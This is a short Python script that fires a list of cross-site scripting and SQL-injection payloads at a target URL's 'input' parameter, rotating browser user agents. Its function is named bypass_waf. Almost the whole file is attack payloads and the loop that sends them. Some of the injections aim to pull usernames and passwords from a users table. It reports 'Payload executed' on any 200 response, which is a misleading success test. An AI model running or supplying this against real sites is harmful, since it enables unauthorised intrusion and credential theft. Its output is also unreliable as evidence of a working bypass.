import requests
import random
import re

WAF_BYPASS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "1' OR 1=1 --",
    "UNION SELECT null, username, password FROM users --",
    "' OR 'a' = 'a' --",
    "<svg/onload=alert('WAF Bypass Test')>",
    "admin' --",
    "/**/OR/**/1=1--",
    "‘ OR 1=1 --",
    "0x31 OR 1=1"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/89.0.774.57 Safari/537.36"
]

def generate_random_user_agent():
    return random.choice(USER_AGENTS)

def send_request(url, payload, headers):
    try:
        response = requests.get(url, headers=headers, params={"input": payload})
        if response.status_code == 200:
            print(f"Payload executed: {payload}")
        else:
            print(f"Failed request: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

def bypass_waf(url):
    headers = {
        "User-Agent": generate_random_user_agent()
    }
    
    for payload in WAF_BYPASS_PAYLOADS:
        print(f"Trying payload: {payload}")
        send_request(url, payload, headers)
